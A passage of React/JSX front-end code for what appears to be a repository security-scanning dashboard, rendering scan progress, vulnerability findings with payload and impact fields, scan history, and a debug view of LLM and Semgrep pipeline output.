                                  ? `${Math.floor(estimatedTimeRemaining / 60)}m ${estimatedTimeRemaining % 60}s`
                                  : `${estimatedTimeRemaining}s`} remaining`}
                          </div>
                        )}
                      </div>
                    </div>

                    <div className="space-y-2">
                      <Progress value={scanProgress} className="h-3" />
                    </div>

                    <motion.div
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="grid grid-cols-3 md:grid-cols-6 gap-3 pt-2"
                    >
                      <div className={`flex items-center gap-1.5 text-xs ${scanProgress >= 15 ? 'text-green-500 font-medium' : 'text-muted-foreground'}`}>
                        {scanProgress >= 15 ? <CheckCircle className="w-3.5 h-3.5" /> : <Clock className="w-3.5 h-3.5" />}
                        Wrapper Hunter
                      </div>
                      <div className={`flex items-center gap-1.5 text-xs ${scanProgress >= 30 ? 'text-green-500 font-medium' : scanProgress >= 15 ? 'text-primary' : 'text-muted-foreground'}`}>
                        {scanProgress >= 30 ? <CheckCircle className="w-3.5 h-3.5" /> : scanProgress >= 15 ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Clock className="w-3.5 h-3.5" />}
                        Wrappers Found
                      </div>
                      <div className={`flex items-center gap-1.5 text-xs ${scanProgress >= 45 ? 'text-green-500 font-medium' : scanProgress >= 30 ? 'text-primary' : 'text-muted-foreground'}`}>
                        {scanProgress >= 45 ? <CheckCircle className="w-3.5 h-3.5" /> : scanProgress >= 30 ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Clock className="w-3.5 h-3.5" />}
                        AI Analysis
                      </div>
                      <div className={`flex items-center gap-1.5 text-xs ${scanProgress >= 55 ? 'text-green-500 font-medium' : scanProgress >= 45 ? 'text-primary' : 'text-muted-foreground'}`}>
                        {scanProgress >= 55 ? <CheckCircle className="w-3.5 h-3.5" /> : scanProgress >= 45 ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Clock className="w-3.5 h-3.5" />}
                        Semgrep Scan
                      </div>
                      <div className={`flex items-center gap-1.5 text-xs ${scanProgress >= 85 ? 'text-green-500 font-medium' : scanProgress >= 55 ? 'text-primary' : 'text-muted-foreground'}`}>
                        {scanProgress >= 85 ? <CheckCircle className="w-3.5 h-3.5" /> : scanProgress >= 55 ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Clock className="w-3.5 h-3.5" />}
                        Results
                      </div>
                      <div className={`flex items-center gap-1.5 text-xs ${scanProgress >= 100 ? 'text-green-500 font-medium' : scanProgress >= 85 ? 'text-primary' : 'text-muted-foreground'}`}>
                        {scanProgress >= 100 ? <CheckCircle className="w-3.5 h-3.5" /> : scanProgress >= 85 ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Clock className="w-3.5 h-3.5" />}
                        Complete
                      </div>
                    </motion.div>
                  </div>
                </CardContent>
              </Card>
            </motion.div>
          )}
        </AnimatePresence>

        {/* AI Analysis Warning Banner */}
        {scans.length > 0 && scans[0].ai_analysis_warning && (
          <motion.div
            initial={{ opacity: 0, y: -10 }}
            animate={{ opacity: 1, y: 0 }}
            className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-4 flex gap-3 text-yellow-600 dark:text-yellow-400"
          >
            <AlertTriangle className="w-5 h-5 shrink-0" />
            <div className="text-sm">
              <span className="font-semibold block mb-1">AI Analysis Warning (Latest Scan)</span>
              {scans[0].ai_analysis_warning}
            </div>
          </motion.div>
        )}

        {/* Branch Selector & Stats */}
        <div className="grid grid-cols-1 lg:grid-cols-4 gap-4">
          {/* Branch Selector */}
          <Card>
            <CardContent className="pt-6">
              <div className="text-sm text-muted-foreground mb-2">Branch</div>
              <Select value={selectedBranch} onValueChange={setSelectedBranch}>
                <SelectTrigger>
                  <div className="flex items-center gap-2">
                    <GitBranch className="w-4 h-4" />
                    <SelectValue placeholder="Select branch" />
                  </div>
                </SelectTrigger>
                <SelectContent>
                  {branches.map((branch) => (
                    <SelectItem key={branch.name} value={branch.name}>
                      <div className="flex items-center gap-2">
                        {branch.name}
                        {branch.name === defaultBranch && (
                          <Badge variant="outline" className="text-xs">default</Badge>
                        )}
                      </div>
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </CardContent>
          </Card>

          {/* Stats */}
          <Card data-testid="risk-score-stat">
            <CardContent className="pt-6">
              <div className="text-sm text-muted-foreground mb-2">Risk Score</div>
              <div className="text-3xl font-bold">{repo?.risk_score || 'N/A'}</div>
            </CardContent>
          </Card>
          <Card data-testid="vulnerabilities-stat">
            <CardContent className="pt-6">
              <div className="text-sm text-muted-foreground mb-2">Vulnerabilities</div>
              <div className="text-3xl font-bold text-destructive">{vulnerabilities.length}</div>
            </CardContent>
          </Card>
          <Card data-testid="patterns-stat">
            <CardContent className="pt-6">
              <div className="text-sm text-muted-foreground mb-2">Debug Runs</div>
              <div className="text-3xl font-bold text-primary">{scanDebug ? (scanDebug.vuln_wrapper_count ?? 0) : '—'}</div>
            </CardContent>
          </Card>
        </div>

        {/* Main Content Tabs */}
        <Tabs defaultValue="files" className="space-y-6" onValueChange={handleTabChange}>
          <TabsList className="grid w-full md:w-auto md:inline-grid grid-cols-4 gap-4">
            <TabsTrigger value="files" data-testid="tab-files">
              <Folder className="w-4 h-4 mr-2" />
              Files
            </TabsTrigger>
            <TabsTrigger value="vulnerabilities" data-testid="tab-vulnerabilities">
              <Shield className="w-4 h-4 mr-2" />
              Vulnerabilities
            </TabsTrigger>
            <TabsTrigger value="scans" data-testid="tab-scans">
              <Scan className="w-4 h-4 mr-2" />
              Scan History
            </TabsTrigger>
            <TabsTrigger value="ai-patterns" data-testid="tab-patterns">
              <Bot className="w-4 h-4 mr-2" />
              Debug
            </TabsTrigger>
          </TabsList>

          {/* Files Tab */}
          <TabsContent value="files">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Folder className="w-5 h-5" />
                  File Structure
                </CardTitle>
                <CardDescription>
                  Browse repository files on branch: {selectedBranch}
                </CardDescription>
              </CardHeader>
              <CardContent>
                {loadingTree ? (
                  <div className="flex items-center justify-center py-12">
                    <Loader2 className="w-8 h-8 animate-spin text-muted-foreground" />
                  </div>
                ) : fileTree.length === 0 ? (
                  <div className="text-center py-12">
                    <Folder className="w-16 h-16 mx-auto mb-4 opacity-50 text-muted-foreground" />
                    <p className="text-muted-foreground">No files found</p>
                  </div>
                ) : (
                  <ScrollArea className="h-[500px]">
                    <div className="pr-4">
                      {fileTree.map((item, idx) => (
                        <FileTreeItem
                          key={item.path || idx}
                          item={item}
                          vulnerabilitiesByFile={vulnerabilitiesByFile}
                          onFileClick={handleFileVulnClick}
                        />
                      ))}
                    </div>
                  </ScrollArea>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          {/* Vulnerabilities Tab */}
          <TabsContent value="vulnerabilities" className="space-y-4">
            {vulnerabilities.length === 0 ? (
              <Card>
                <CardContent className="py-12 text-center">
                  <Shield className="w-16 h-16 mx-auto mb-4 opacity-50 text-green-500" />
                  <p className="text-lg text-muted-foreground">No vulnerabilities found</p>
                  <p className="text-sm text-muted-foreground mt-2">
                    Run a scan to check for security issues
                  </p>
                </CardContent>
              </Card>
            ) : (
              groupedByFileThenCategory.map((fileGroup, fileIndex) => (
                <Card key={fileGroup.filePath} className="border-border/60" data-testid={`vuln-file-group-${fileIndex}`}>
                  <CardHeader className="pb-3">
                    <div className="flex items-center justify-between gap-3">
                      <div>
                        <CardTitle className="text-base">{fileGroup.filePath}</CardTitle>
                        <CardDescription>File-wise grouped findings</CardDescription>
                      </div>
                      <Badge variant={fileGroup.totalFindings > 0 ? 'secondary' : 'outline'}>
                        {fileGroup.totalFindings} finding{fileGroup.totalFindings !== 1 ? 's' : ''}
                      </Badge>
                    </div>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-4">
                      {fileGroup.categories.map((group, groupIndex) => (
                        <div key={`${fileGroup.filePath}-${group.category}`} className="rounded-md border border-border/50 p-3">
                          <div className="flex items-center justify-between mb-3">
                            <h4 className="text-sm font-semibold">{group.category}</h4>
                            <Badge variant={group.items.length > 0 ? 'secondary' : 'outline'}>
                              {group.items.length} finding{group.items.length !== 1 ? 's' : ''}
                            </Badge>
                          </div>

                          <div className="space-y-3">
                            {group.items.map((vuln, index) => (
                              <motion.div
                                key={vuln.id || `${fileGroup.filePath}-${group.category}-${index}`}
                                initial={{ opacity: 0, y: 10 }}
                                animate={{ opacity: 1, y: 0 }}
                                transition={{ delay: (fileIndex * 0.02) + (groupIndex * 0.02) + (index * 0.01) }}
                              >
                                <Card className="hover:border-primary/30 transition-all" data-testid={`vuln-${fileIndex}-${groupIndex}-${index}`}>
                                  <CardHeader>
                                    <div className="flex items-start justify-between gap-3">
                                      <div>
                                        <CardTitle className="text-lg">{vuln.title}</CardTitle>
                                        <CardDescription>
                                          {vuln.file_path || 'unknown-file'}{vuln.line_number ? `:${vuln.line_number}` : ''}
                                        </CardDescription>
                                      </div>
                                      <div className="flex items-center gap-2">
                                        <Badge variant="outline">{vuln.type || 'Security Misconfiguration'}</Badge>
                                        <Badge variant={getSeverityColor(vuln.severity)}>
                                          {(vuln.severity || 'medium').toUpperCase()}
                                        </Badge>
                                      </div>
                                    </div>
                                  </CardHeader>
                                  <CardContent>
                                    <div className="mb-3 rounded-md border border-border/60 bg-background px-3 py-3">
                                      <ReactMarkdown components={MARKDOWN_COMPONENTS}>
                                        {vuln.description}
                                      </ReactMarkdown>
                                    </div>
                                    {vuln.reason && vuln.reason !== vuln.description && (
                                      <p className="text-xs text-muted-foreground mb-3">AI Analysis: {vuln.reason}</p>
                                    )}

                                    <div className="mb-3 rounded-md border border-border/70 bg-background px-3 py-3">
                                      <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">Affected Line</p>
                                      {vuln.affected_line_link ? (
                                        <a
                                          href={vuln.affected_line_link}
                                          target="_blank"
                                          rel="noreferrer"
                                          className="text-sm text-foreground underline decoration-foreground/40 hover:text-primary"
                                        >
                                          {vuln.file_path || 'unknown-file'}{vuln.line_number ? `:${vuln.line_number}` : ''}
                                        </a>
                                      ) : (
                                        <p className="text-sm text-foreground">{vuln.file_path || 'unknown-file'}{vuln.line_number ? `:${vuln.line_number}` : ''}</p>
                                      )}
                                      {Array.isArray(vuln.all_affected_lines) && vuln.all_affected_lines.length > 0 && (
                                        <p className="text-xs text-muted-foreground mt-2 flex items-center">
                                          <span>Exact Affected Lines: [ {vuln.all_affected_lines.join(', ')} ]</span>
                                          {(vuln.check_id?.includes('fixora-wrapper') || vuln.source === 'fixora-ai-analysis' || vuln.wrapper_defined_in) && (
                                            <span className="ml-2 px-1.5 py-0.5 bg-blue-500/20 text-blue-400 border border-blue-500/30 rounded text-[10px] font-bold uppercase tracking-wider">Wrapper Definition</span>
                                          )}
                                        </p>
                                      )}
                                    </div>

                                    {vuln.code_snippet && (
                                      <pre className="bg-slate-950 border border-slate-700 p-4 rounded-md text-xs font-mono overflow-x-auto mb-3 text-slate-100">
                                        <code>{vuln.code_snippet}</code>
                                      </pre>
                                    )}

                                    {(vuln.vulnerable_parameter || vuln.malicious_payload || vuln.exploit_injected_example || vuln.exploit_explanation || vuln.impact_summary) && (
                                      <div className="space-y-3 mb-3">
                                        <div className="rounded-md border border-border/70 bg-background px-3 py-3">
                                          <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">Vulnerable Parameter</p>
                                          <p className="text-sm text-foreground">{vuln.vulnerable_parameter || 'user_input'}</p>
                                        </div>

                                        <div className="rounded-md border border-border/70 bg-background px-3 py-3">
                                          <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">Malicious Payload (raw)</p>
                                          <pre className="bg-slate-950 border border-slate-700 p-3 rounded-md text-xs font-mono whitespace-pre-wrap break-words text-slate-100">{vuln.malicious_payload || '<attacker_payload>'}</pre>
                                        </div>

                                        <div className="rounded-md border border-border/70 bg-background px-3 py-3">
                                          <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">Payload Inserted In Function</p>
                                          <pre className="bg-slate-950 border border-slate-700 p-3 rounded-md text-xs font-mono whitespace-pre-wrap break-words text-slate-100">{vuln.exploit_injected_example}</pre>
                                        </div>

                                        <div className="rounded-md border border-border/70 bg-background px-3 py-3">
                                          <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">How Payload Flows</p>
                                          <p className="text-sm text-foreground">{vuln.exploit_explanation || vuln.reason}</p>
                                        </div>

                                        <div className="rounded-md border border-border/70 bg-background px-3 py-3">
                                          <p className="text-xs font-semibold uppercase tracking-wide text-muted-foreground mb-1">Data Loss / Leak Impact</p>
                                          <p className="text-sm text-foreground">{vuln.impact_summary}</p>
                                        </div>
                                      </div>
                                    )}

                                    {vuln.ai_reasoning && (
                                      <div className="bg-primary/10 border border-primary/20 p-3 rounded-md">
                                        <p className="text-sm">
                                          <span className="font-semibold text-primary">AI Analysis: </span>
                                          {vuln.ai_reasoning}
                                        </p>
                                        {typeof vuln.ai_confidence === 'number' && (
                                          <p className="text-xs text-muted-foreground mt-1">
                                            Confidence: {(vuln.ai_confidence * 100).toFixed(0)}%
                                          </p>
                                        )}
                                      </div>
                                    )}
                                  </CardContent>
                                </Card>
                              </motion.div>
                            ))}
                          </div>
                        </div>
                      ))}
                    </div>
                  </CardContent>
                </Card>
              ))
            )}
          </TabsContent>

          {/* Scan History Tab */}
          <TabsContent value="scans" className="space-y-4">
            {scans.length === 0 ? (
              <Card>
                <CardContent className="py-12 text-center">
                  <Scan className="w-16 h-16 mx-auto mb-4 opacity-50 text-muted-foreground" />
                  <p className="text-lg text-muted-foreground">No scans yet</p>
                  <p className="text-sm text-muted-foreground mt-2">
                    Click "Start Scan" to run your first security scan
                  </p>
                </CardContent>
              </Card>
            ) : (
              scans.map((scan, index) => (
                <motion.div
                  key={scan.id}
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: index * 0.05 }}
                >
                  <Card>
                    <CardHeader>
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          {getScanStatusBadge(scan.status)}
                          <div>
                            <CardTitle className="text-base">
                              {scan.scan_mode === 'full' ? 'Full Scan' : 'Diff Scan'}
                            </CardTitle>
                            <CardDescription className="flex items-center gap-2">
                              <GitBranch className="w-3 h-3" />
                              {scan.branch}
                              <span>•</span>
                              {new Date(scan.started_at).toLocaleString()}
                            </CardDescription>
                          </div>
                        </div>
                        {scan.vulnerability_count !== undefined && (
                          <div className="text-right">
                            <div className="text-2xl font-bold text-destructive">
                              {scan.vulnerability_count}
                            </div>
                            <div className="text-xs text-muted-foreground">vulnerabilities</div>
                          </div>
                        )}
                      </div>
                    </CardHeader>
                    {scan.severity_counts && (
                      <CardContent className="pt-0">
                        <div className="flex gap-2">
                          {scan.severity_counts.critical > 0 && (
                            <Badge variant="destructive">
                              {scan.severity_counts.critical} Critical
                            </Badge>
                          )}
                          {scan.severity_counts.high > 0 && (
                            <Badge variant="destructive">
                              {scan.severity_counts.high} High
                            </Badge>
                          )}
                          {scan.severity_counts.medium > 0 && (
                            <Badge variant="default">
                              {scan.severity_counts.medium} Medium
                            </Badge>
                          )}
                          {scan.severity_counts.low > 0 && (
                            <Badge variant="secondary">
                              {scan.severity_counts.low} Low
                            </Badge>
                          )}
                        </div>
                      </CardContent>
                    )}
                  </Card>
                </motion.div>
              ))
            )}
          </TabsContent>



          {/* AI Debug Tab */}
          <TabsContent value="ai-patterns">
            <div className="space-y-4">
              {/* Header row */}
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-xl font-semibold flex items-center gap-2">
                    <Bot className="w-5 h-5 text-primary" />
                    Pipeline Debug
                  </h2>
                  <p className="text-sm text-muted-foreground mt-1">
                    Full trace of Wrapper Hunter → Groq LLM → Semgrep rules (scan-wise)
                  </p>
                </div>
                <div className="flex items-center gap-2">
                  {!loadingDebug && scanDebugRuns.length > 0 && (
                    <Select
                      value={selectedDebugRunId || scanDebugRuns[0].id}
                      onValueChange={handleDebugRunChange}
                    >
                      <SelectTrigger className="w-[320px]" data-testid="ai-debug-run-select">
                        <SelectValue placeholder="Select debug run" />
                      </SelectTrigger>
                      <SelectContent>
                        {scanDebugRuns.map((run) => (
                          <SelectItem key={run.id} value={run.id}>
                            {run.scan_id?.slice(0, 8)} • {new Date(run.created_at).toLocaleString()} • {run.vuln_wrapper_count ?? 0} wrappers
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  )}
                  <Button variant="outline" size="sm" onClick={() => fetchScanDebug(selectedDebugRunId || null)} disabled={loadingDebug}>
                    {loadingDebug ? <Loader2 className="w-4 h-4 animate-spin" /> : <RefreshCw className="w-4 h-4" />}
                    <span className="ml-2">Refresh</span>
                  </Button>
                </div>
              </div>

              {/* Loading */}
              {loadingDebug && (
                <Card>
                  <CardContent className="py-16 flex flex-col items-center gap-3">
                    <Loader2 className="w-10 h-10 animate-spin text-primary" />
                    <p className="text-muted-foreground">Loading scan debug data…</p>
                  </CardContent>
                </Card>
              )}

              {/* Error / no data */}
              {!loadingDebug && debugError && (
                <Card>
                  <CardContent className="py-12 text-center">
                    <Bot className="w-14 h-14 mx-auto mb-4 opacity-40 text-muted-foreground" />
                    <p className="text-muted-foreground">{debugError}</p>
                  </CardContent>
                </Card>
              )}

              {/* Data loaded */}
              {!loadingDebug && scanDebug && (() => {
                const wd = scanDebug.wrapper_hunter_results;
                const llmR = scanDebug.llm_result;
                const yaml = scanDebug.custom_rules_yaml;
                const prompt = scanDebug.llm_prompt;
                const hasDetailedPrompt = Boolean(
                  prompt
                  && !prompt.includes('(2-phase analysis: module-sink prompt + per-chunk function prompts)')
                  && !prompt.startsWith('(Truncated')
                  && !prompt.startsWith('(No prompt snapshot available')
                );

                const severityColor = (s) => ({
                  HIGH: 'bg-red-500/15 text-red-400 border-red-500/30',
                  CRITICAL: 'bg-red-600/20 text-red-300 border-red-600/30',
                  MEDIUM: 'bg-yellow-500/15 text-yellow-400 border-yellow-500/30',
                  LOW: 'bg-blue-500/15 text-blue-400 border-blue-500/30',
                })[s?.toUpperCase()] || 'bg-muted text-muted-foreground';

                return (
                  <div className="space-y-6">

                    {/* Scan meta */}
                    <Card className="border-border/50">
                      <CardContent className="pt-4 pb-3 flex flex-wrap gap-4 text-sm">
                        <span className="flex items-center gap-1.5 text-muted-foreground"><Clock className="w-3.5 h-3.5" /> Scan ID: <code className="text-foreground font-mono text-xs">{scanDebug.scan_id}</code></span>
                        <span className="flex items-center gap-1.5 text-muted-foreground">Status: <Badge variant={scanDebug.status === 'completed' ? 'default' : 'secondary'}>{scanDebug.status}</Badge></span>
                        <span className="flex items-center gap-1.5 text-muted-foreground">Phase: <code className="text-foreground text-xs">{scanDebug.phase}</code></span>
                        {scanDebug.completed_at && <span className="flex items-center gap-1.5 text-muted-foreground">Completed: {new Date(scanDebug.completed_at).toLocaleString()}</span>}
                      </CardContent>
                    </Card>

                    {/* Inner navigation */}
                    <div className="flex gap-2 flex-wrap">
                      {[
                        { key: 'wrapper', label: 'Wrapper Hunter', icon: Terminal },
                        ...(hasDetailedPrompt ? [{ key: 'prompt', label: 'LLM Prompt', icon: Code2 }] : []),
                        { key: 'llm', label: 'LLM Result', icon: Cpu },
                        { key: 'rules', label: 'Semgrep Rules', icon: Zap },
                      ].map(({ key, label, icon: Icon }) => (
                        <button
                          key={key}
                          onClick={() => setDebugInnerTab(key)}
                          className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium border transition-colors ${debugInnerTab === key
                              ? 'bg-primary text-primary-foreground border-primary'
                              : 'bg-muted/40 text-muted-foreground border-border hover:bg-muted'
                            }`}
                        >
                          <Icon className="w-3.5 h-3.5" />{label}
                        </button>
                      ))}
                    </div>

                    {/* ───── WRAPPER HUNTER ───── */}
                    {debugInnerTab === 'wrapper' && (
                      <div className="space-y-4">
                        {!wd ? (
                          <Card><CardContent className="py-10 text-center text-muted-foreground">No wrapper hunter data in this scan yet.</CardContent></Card>
                        ) : (
                          <>
                            {Array.isArray(wd.scan_targets) && wd.scan_targets.length > 0 && (
                              <Card className="border-border/60">
                                <CardHeader className="pb-2 pt-4">
                                  <CardTitle className="text-sm flex items-center gap-2">
                                    <Database className="w-3.5 h-3.5" />
                                    Scan Targets ({wd.scan_targets.length})
                                  </CardTitle>
                                  <CardDescription className="text-xs">
                                    Wrapper Hunter executed per folder/language target to avoid monorepo cross-contamination
                                  </CardDescription>
                                </CardHeader>
                                <CardContent className="space-y-2">
                                  {wd.scan_targets.map((t, i) => (
                                    <div key={`${t.language}-${t.scan_path || i}-${i}`} className="text-xs text-muted-foreground">
                                      <span className="font-mono text-foreground">[{t.language}] {t.scan_path || t.root_path || '.'}</span>
                                      {t.root_path && t.root_path !== t.scan_path && (
                                        <span className="ml-1">(root: {t.root_path})</span>
                                      )}
                                      <span className="ml-1">• {t.wrapper_count ?? 0} wrapper{(t.wrapper_count ?? 0) !== 1 ? 's' : ''}</span>
                                      {t.modules?.all && (
                                        <span className="ml-1">• {t.modules.all.length} module{t.modules.all.length !== 1 ? 's' : ''}</span>
                                      )}
                                    </div>
                                  ))}
                                </CardContent>
                              </Card>
                            )}

                            {Object.entries(wd.results || {}).map(([lang, section]) => (
                              <div key={lang} className="space-y-3">
                                <h3 className="font-semibold text-base flex items-center gap-2">
                                  <Terminal className="w-4 h-4 text-primary" />
                                  {lang === 'python' ? '🐍 Python' : '⚛️ React / JS'} — {wd.language}
                                </h3>

                                {/* Modules */}
                                <Card className="border-border/60">
                                  <CardHeader className="pb-2 pt-4">
                                    <CardTitle className="text-sm flex items-center gap-2"><Database className="w-3.5 h-3.5" /> Modules Discovered</CardTitle>
                                  </CardHeader>
                                  <CardContent className="space-y-3">
                                    <div>
                                      <p className="text-xs text-muted-foreground font-medium mb-1">From manifest ({(section.modules?.from_manifest || []).length})</p>
                                      <div className="flex flex-wrap gap-1.5">
                                        {(section.modules?.from_manifest || []).map(m => <span key={m} className="px-2 py-0.5 bg-muted rounded text-xs font-mono">{m}</span>)}
                                        {!section.modules?.from_manifest?.length && <span className="text-xs text-muted-foreground italic">none</span>}
                                      </div>
                                    </div>
                                    <div>
                                      <p className="text-xs text-muted-foreground font-medium mb-1">From imports ({(section.modules?.from_imports || []).length})</p>
                                      <div className="flex flex-wrap gap-1.5 max-h-24 overflow-y-auto">
                                        {(section.modules?.from_imports || []).map(m => <span key={m} className="px-2 py-0.5 bg-muted rounded text-xs font-mono">{m}</span>)}
                                        {!section.modules?.from_imports?.length && <span className="text-xs text-muted-foreground italic">none</span>}
                                      </div>
                                    </div>
                                  </CardContent>
                                </Card>

                                {/* Wrapper functions */}
                                <Card className="border-border/60">
                                  <CardHeader className="pb-2 pt-4">
                                    <CardTitle className="text-sm">Wrapper Functions Found ({(section.wrapper_functions || []).length})</CardTitle>
                                  </CardHeader>
                                  <CardContent>
                                    {!(section.wrapper_functions || []).length ? (
                                      <p className="text-sm text-muted-foreground italic">No wrapper functions found.</p>
                                    ) : (
                                      <div className="space-y-3">
                                        {section.wrapper_functions.map((fn, i) => (
                                          <div key={i} className="border border-border/50 rounded-lg p-3 space-y-2">
                                            <div className="flex items-center justify-between flex-wrap gap-2">
                                              <code className="font-mono font-semibold text-sm text-foreground">{fn.function_name}()</code>
                                              <span className="text-xs text-muted-foreground font-mono">{fn.file} L{fn.line_start}–{fn.line_end}</span>
                                            </div>
                                            <div className="flex flex-wrap gap-1.5">
                                              {(fn.calls || []).map(c => <span key={c} className="px-1.5 py-0.5 bg-orange-500/15 border border-orange-500/25 text-orange-400 rounded text-xs font-mono">{c}</span>)}
                                            </div>
                                            {fn.source_code && (
                                              <pre className="text-xs font-mono bg-muted/60 rounded p-3 overflow-x-auto max-h-48 whitespace-pre-wrap border border-border/40">{fn.source_code}</pre>
                                            )}
                                          </div>
                                        ))}
                                      </div>
                                    )}
                                  </CardContent>
                                </Card>
                              </div>
                            ))}
                          </>
                        )}
                      </div>
                    )}

                    {/* ───── LLM PROMPT ───── */}
                    {debugInnerTab === 'prompt' && hasDetailedPrompt && (
                      <Card className="border-border/60">
                        <CardHeader className="pb-2 pt-4 flex flex-row items-center justify-between">
                          <CardTitle className="text-sm flex items-center gap-2"><Code2 className="w-3.5 h-3.5" /> Exact Prompt Sent to Groq LLM</CardTitle>
                          <Button variant="ghost" size="sm" onClick={() => copyToClipboard(prompt, 'prompt')}>
                            {copiedSection === 'prompt' ? <Check className="w-3.5 h-3.5 text-green-500" /> : <Copy className="w-3.5 h-3.5" />}
                            <span className="ml-1.5 text-xs">{copiedSection === 'prompt' ? 'Copied!' : 'Copy'}</span>
                          </Button>
                        </CardHeader>
                        <CardContent>
                          {!prompt ? (
                            <p className="text-sm text-muted-foreground italic">No prompt data available — wrapper hunter hasn't run yet.</p>
                          ) : (
                            <ScrollArea className="h-[600px]">
                              <pre className="text-xs font-mono bg-muted/60 rounded p-4 whitespace-pre-wrap border border-border/40 leading-relaxed">{prompt}</pre>
                            </ScrollArea>
                          )}
                        </CardContent>
                      </Card>
                    )}

                    {/* ───── LLM RESULT ───── */}
                    {debugInnerTab === 'llm' && (
                      <div className="space-y-4">
                        {!llmR ? (
                          <Card><CardContent className="py-10 text-center text-muted-foreground">No LLM result yet — AI analysis hasn't run.</CardContent></Card>
                        ) : (
                          <>
                            {/* Summary banner */}
                            <Card className="border-primary/30 bg-primary/5">
                              <CardContent className="py-3 flex items-center gap-3">
                                <Cpu className="w-5 h-5 text-primary" />
                                <div>
                                  <p className="text-sm font-medium">{llmR.analysis_summary}</p>
                                  <p className="text-xs text-muted-foreground">Language: {llmR.language}</p>
                                </div>
                                {llmR.error && <Badge variant="destructive" className="ml-auto">Error</Badge>}
                              </CardContent>
                            </Card>

                            {Array.isArray(wd?.scan_targets) && wd.scan_targets.length > 0 && (
                              <Card className="border-border/60">
                                <CardHeader className="pb-2 pt-4">
                                  <CardTitle className="text-sm">Folder / Language Result Breakdown</CardTitle>
                                </CardHeader>
                                <CardContent className="space-y-1.5">
                                  {wd.scan_targets.map((t, i) => {
                                    const langSection = llmR.results?.[t.language] || {};
                                    const allFns = langSection.wrapper_functions || [];
                                    const normalizedScan = (t.scan_path || '.').replace(/\\/g, '/');
                                    const prefix = normalizedScan === '.'
                                      ? ''
                                      : `${normalizedScan.replace(/\/+$/, '')}/`;
                                    const vulnCount = prefix
                                      ? allFns.filter((fn) => (fn.file || '').replace(/\\/g, '/').startsWith(prefix)).length
                                      : allFns.length;

                                    return (
                                      <div key={`${t.language}-${t.scan_path || i}-${i}`} className="text-xs text-muted-foreground">
                                        <span className="font-mono text-foreground">[{t.language}] {t.scan_path || t.root_path || '.'}</span>
                                        <span className="ml-1">• {vulnCount} vulnerable wrapper{vulnCount !== 1 ? 's' : ''}</span>
                                      </div>
                                    );
                                  })}
                                </CardContent>
                              </Card>
                            )}

                            {Object.entries(llmR.results || {}).map(([lang, section]) => (
                              <div key={lang} className="space-y-3">
                                <h3 className="font-semibold text-sm text-muted-foreground uppercase tracking-wider">{lang}</h3>

                                {/* Sink modules */}
                                <Card className="border-border/60">
                                  <CardHeader className="pb-2 pt-4">
                                    <CardTitle className="text-sm flex items-center gap-2"><Database className="w-3.5 h-3.5 text-red-400" /> Sink Modules Identified</CardTitle>
                                    {section.modules?.reason && <CardDescription className="text-xs">{section.modules.reason}</CardDescription>}
                                  </CardHeader>
                                  <CardContent>
                                    <div className="flex flex-wrap gap-2">
                                      {(section.modules?.sink_modules || []).map(m => (
                                        <span key={m} className="px-2.5 py-1 bg-red-500/15 border border-red-500/25 text-red-400 rounded-full text-xs font-mono font-semibold">{m}</span>
                                      ))}
                                      {!section.modules?.sink_modules?.length && <span className="text-xs text-muted-foreground italic">No dangerous sink modules found.</span>}
                                    </div>
                                  </CardContent>
                                </Card>

                                {/* Vulnerable wrappers */}
                                <Card className="border-border/60">
                                  <CardHeader className="pb-2 pt-4">
                                    <CardTitle className="text-sm">Vulnerable Wrapper Functions ({(section.wrapper_functions || []).length})</CardTitle>
                                  </CardHeader>
                                  <CardContent>
                                    {!(section.wrapper_functions || []).length ? (
                                      <p className="text-sm text-muted-foreground italic">No vulnerable wrappers found — all functions are safe or no data.</p>
                                    ) : (
                                      <div className="space-y-3">
                                        {section.wrapper_functions.map((fn, i) => (
                                          <div key={i} className="border border-border/50 rounded-lg p-4 space-y-2">
                                            <div className="flex items-start justify-between gap-3 flex-wrap">
                                              <div>
                                                <code className="font-mono font-semibold text-sm">{fn.function_name}()</code>
                                                <span className="ml-2 text-xs text-muted-foreground font-mono">{fn.file}</span>
                                              </div>
                                              <div className="flex gap-2">
                                                <span className={`px-2 py-0.5 rounded border text-xs font-semibold ${severityColor(fn.severity)}`}>{fn.severity}</span>
                                                <span className="px-2 py-0.5 rounded bg-muted border border-border text-xs">{fn.vulnerability_type}</span>
                                              </div>
                                            </div>
                                            <p className="text-xs text-muted-foreground leading-relaxed">{fn.reason}</p>
                                            <div className="flex flex-wrap gap-1.5">
                                              {(fn.calls || []).map(c => <span key={c} className="px-1.5 py-0.5 bg-orange-500/15 border border-orange-500/25 text-orange-400 rounded text-xs font-mono">{c}</span>)}
                                            </div>
                                            {fn.source_code && (
                                              <pre className="text-xs font-mono bg-muted/60 rounded p-3 overflow-x-auto max-h-48 whitespace-pre-wrap border border-border/40">{fn.source_code}</pre>
                                            )}
                                          </div>
                                        ))}
                                      </div>
                                    )}
                                  </CardContent>
                                </Card>
                              </div>
                            ))}

                            {/* Raw JSON toggle */}
                            <Card className="border-border/60">
                              <CardHeader className="pb-2 pt-4 flex flex-row items-center justify-between">
                                <CardTitle className="text-sm">Raw LLM JSON (sink_modules.json)</CardTitle>
